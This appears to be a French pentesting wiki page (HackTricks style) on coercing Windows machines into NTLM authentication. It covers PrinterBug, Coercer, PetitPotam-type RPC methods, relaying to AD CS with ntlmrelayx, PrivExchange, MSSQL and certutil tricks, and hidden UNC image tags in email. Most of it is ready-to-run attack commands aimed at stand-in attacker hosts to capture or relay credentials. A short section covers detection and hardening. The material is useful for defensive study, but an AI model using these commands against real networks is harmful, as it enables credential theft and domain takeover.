# Forcer une authentification privilégiée NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **remote authentication triggers** codés en C# à l’aide du compilateur MIDL afin d’éviter les dépendances tierces.

## Abus du service Spooler

Si le service _**Print Spooler**_ est **activé,** vous pouvez utiliser certaines credentials AD déjà connues pour **demander** au serveur d’impression du Domain Controller une **mise à jour** concernant les nouveaux travaux d’impression, puis lui indiquer d’**envoyer la notification à un système** donné.\
Notez que lorsqu’une imprimante envoie la notification à des systèmes arbitraires, elle doit s’**authentifier auprès de** ce **système**. Par conséquent, un attaquant peut forcer le service _**Print Spooler**_ à s’authentifier auprès d’un système arbitraire, et le service **utilisera le compte ordinateur** lors de cette authentification.

En interne, la primitive classique **PrinterBug** abuse de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** via **`\\PIPE\\spoolss`**. L’attaquant ouvre d’abord un handle vers une imprimante ou un serveur, puis fournit un faux nom de client dans `pszLocalMachine`, afin que le spooler cible crée un canal de notification **vers l’hôte contrôlé par l’attaquant**. C’est pourquoi l’effet est une **coercition d’authentification sortante**, et non une exécution de code directe.<sup>[[2]](#references)</sup>\
Si vous recherchez une **RCE/LPE** dans le spooler lui-même, consultez [PrintNightmare](printnightmare.md). Cette page se concentre sur la **coercition et le relay**.

### Trouver les serveurs Windows du domaine

Utilisez PowerShell pour lister les hôtes Windows. Les serveurs sont généralement les cibles prioritaires, concentrez-vous donc d’abord sur eux :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Recherche des services Spooler à l'écoute

À l'aide d'une version légèrement modifiée de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), vérifiez si le Spooler Service est à l'écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser `rpcdump.py` sous Linux et rechercher le protocole **MS-RPRN** :
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ou testez rapidement les hôtes depuis Linux avec **NetExec/CrackMapExec** :
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Si vous souhaitez **énumérer les surfaces de coercition** plutôt que de simplement vérifier si le endpoint du spooler existe, utilisez le **mode scan de Coercer** :<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Cela est utile, car voir l’endpoint dans EPM vous indique uniquement que l’interface RPC d’impression est enregistrée. Cela ne garantit **pas** que chaque méthode de coercition soit accessible avec vos privilèges actuels, ni que l’hôte émette un flux d’authentification exploitable.

### Demander au service de s’authentifier auprès d’un hôte arbitraire

Vous pouvez compiler [SpoolSample depuis ici](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sur Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Avec **Coercer**, vous pouvez cibler directement les interfaces du spooler et éviter de deviner quelle méthode RPC est exposée :<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Callbacks modernes RPC-over-TCP

Ne supposez pas qu'un appel `RpcRemoteFindFirstPrinterChangeNotificationEx` réussi doit nécessairement produire du trafic sur TCP/445. **Windows 11 22H2 et les versions ultérieures utilisent RPC over TCP par défaut pour les communications d'impression** ; RPC over named pipes est désactivé, sauf si une policy ou `RpcUseNamedPipeProtocol=1` le réactive. Par conséquent, les listeners legacy limités à SMB peuvent indiquer que le trigger a été envoyé sans jamais recevoir le callback. Microsoft documente TCP/135 (Endpoint Mapper) ainsi que des ports RPC dynamiques pour le RPC d'impression normal ; les organisations peuvent restreindre cette plage ou sélectionner un port RPC d'impression fixe.<sup>[[10]](#references)</sup>

L'actuel **Impacket `ntlmrelayx.py`** inclut un serveur RPC relay et un petit Endpoint Mapper, activé par défaut sur TCP/135. Ce support a été intégré en juin 2025 spécifiquement avec une démonstration de la chaîne PrinterBug-to-AD-CS, permettant de relayer le callback RPC authentifié même lorsque la victime ne bascule pas vers SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Recherchez `Setting up RPC Server on port 135` et `RPCD: Received connection` dans la sortie de relay. Si l’appel RPC renvoie une erreur attendue, mais que rien n’atteint le listener, vérifiez la print RPC transport policy de la victime, le filtrage sortant, la résolution DNS et si un autre processus utilise déjà TCP/135. Vérifiez également que `ntlmrelayx` n’a pas été démarré avec `--no-rpc-server`.

### Forcer HTTP au lieu de SMB avec WebClient

Sur les systèmes utilisant encore **RPC over named pipes** (builds legacy ou comportement restauré par la policy), le PrinterBug classique provoque généralement une authentification **SMB** vers `\\attacker\share`, ce qui reste utile pour le **capture**, le **relay vers des cibles HTTP** ou le **relay lorsque la signature SMB est absente**.\
Cependant, le relay de **SMB vers SMB** est fréquemment bloqué par la **signature SMB**. Les operators peuvent donc préférer forcer l’authentification **HTTP/WebDAV** à la place. Il ne s’agit pas d’un fallback pour le comportement RPC-over-TCP décrit ci-dessus.

Si le service **WebClient** est en cours d’exécution sur la cible, le listener peut être spécifié sous une forme qui force Windows à utiliser **WebDAV over HTTP** :
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Cela est particulièrement utile lorsqu'il est chaîné avec **`ntlmrelayx --adcs`** ou d'autres cibles de HTTP relay, car cela évite de dépendre de la relayability SMB sur la connexion forcée. Le point important est que **WebClient doit être en cours d'exécution** sur la victime pour que la variante HTTP/WebDAV fonctionne.

### Combining with Unconstrained Delegation

Si un attaquant a compromis un ordinateur configuré pour [Unconstrained Delegation](unconstrained-delegation.md), il peut **forcer l'imprimante à s'authentifier auprès de cet ordinateur**. Le **TGT** du compte ordinateur de l'imprimante est alors mis en cache en mémoire sur l'hôte avec Unconstrained Delegation, où l'attaquant peut le récupérer et le réutiliser avec [Pass the Ticket](pass-the-ticket.md).

### Detection and hardening notes

La méthode la plus fiable pour supprimer PrinterBug d'un DC, d'un PAW ou d'un serveur qui n'imprime pas consiste à arrêter et désactiver le Spooler. Lorsque l'impression est nécessaire, renforcez chaque destination de relay possible (signature SMB côté serveur, signature LDAP/liaison de canal et EPA sur les services HTTP tels qu'AD CS), plutôt que de supposer que le blocage de TCP/445 sur le chemin de callback est suffisant.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
La détection doit corréler un appel authentifié vers l’UUID MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, en particulier l’opnum 62/65 avec une valeur de callback non locale, ainsi qu’une connexion sortante SMB, HTTP ou RPC immédiate depuis l’hôte du spooler. Établissez une baseline des **UUID d’interface/opnums et des paires source/destination**, et pas uniquement de l’accès à `\PIPE\spoolss`, car les piles d’impression actuelles peuvent placer le callback sur RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## Forçage de l’authentification RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matrice de coercition RPC par chemin UNC (interfaces/opnums qui déclenchent une authentification sortante)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interface d’impression asynchrone sur le même pipe du spooler ; utilisez Coercer pour énumérer les méthodes accessibles sur un hôte donné<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (également via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums couramment abusés: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Remarque : ces méthodes acceptent des paramètres pouvant contenir un chemin UNC (par exemple, `\\attacker\share`). Lorsqu’il est traité, Windows s’authentifie (dans le contexte de la machine ou de l’utilisateur) auprès de cet UNC, ce qui permet la capture ou le relay de NetNTLM.\
Pour l’abus du spooler, **l’opnum 65 de MS-RPRN** reste la primitive la plus courante et la mieux documentée, car la spécification du protocole indique explicitement que le serveur crée un canal de notification vers le client spécifié par `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: coercition ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: la cible tente d’ouvrir le chemin du journal de sauvegarde fourni et s’authentifie auprès de l’UNC contrôlé par l’attaquant.<sup>[[1]](#references)</sup>
- Practical use: contraindre des actifs Tier 0 (DC/RODC/Citrix/etc.) à émettre du NetNTLM, puis effectuer un relay vers des endpoints AD CS (scénarios ESC8/ESC11) ou d’autres services privilégiés.<sup>[[1]](#references)</sup>

## PrivExchange

L’attaque `PrivExchange` est due à une faille trouvée dans la **fonctionnalité `PushSubscription` d’Exchange Server**. Cette fonctionnalité permet de contraindre le serveur Exchange, par n’importe quel utilisateur du domaine disposant d’une mailbox, à s’authentifier auprès de n’importe quel hôte fourni par le client via HTTP.

Par défaut, le **service Exchange s’exécute sous le compte SYSTEM** et dispose de privilèges excessifs (plus précisément, de **privilèges WriteDacl sur le domaine avant la Cumulative Update 2019**). Cette faille peut être exploitée pour permettre le **relay d’informations vers LDAP, puis extraire la base de données NTDS du domaine**. Lorsque le relay vers LDAP n’est pas possible, cette faille peut tout de même être utilisée pour effectuer un relay et s’authentifier auprès d’autres hôtes du domaine. L’exploitation réussie de cette attaque accorde un accès immédiat au Domain Admin avec n’importe quel compte utilisateur authentifié du domaine.

## Dans Windows

Si vous êtes déjà à l’intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d’utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour provoquer une authentification NTLM :
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injection HTML

### Via email

Si vous connaissez l’**adresse e-mail** de l’utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pouvez simplement lui envoyer un **e-mail contenant une image de 1x1 pixel**, telle que
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Lorsque la victime l’ouvre, Windows tente de s’authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM et injecter du HTML dans une page consultée par la victime, essayez d’injecter une image telle que :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Autres moyens de forcer et de phish l’authentification NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si vous pouvez capturer des [challenges NTLMv1, lisez ici comment les cracker](../ntlm/index.html#ntlmv1-attack).\
_N’oubliez pas que pour cracker NTLMv1, vous devez définir le challenge de Responder sur "1122334455667788"_

## References

- [1] [Unit 42 – La coercition d’authentification continue d’évoluer](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN : RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN : protocole de remoting EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN : ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – méthodes d’authentification Windows forcées](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – mises à jour des connexions RPC pour l’impression dans Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – serveur de relay RPC et Endpoint Mapper pour ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
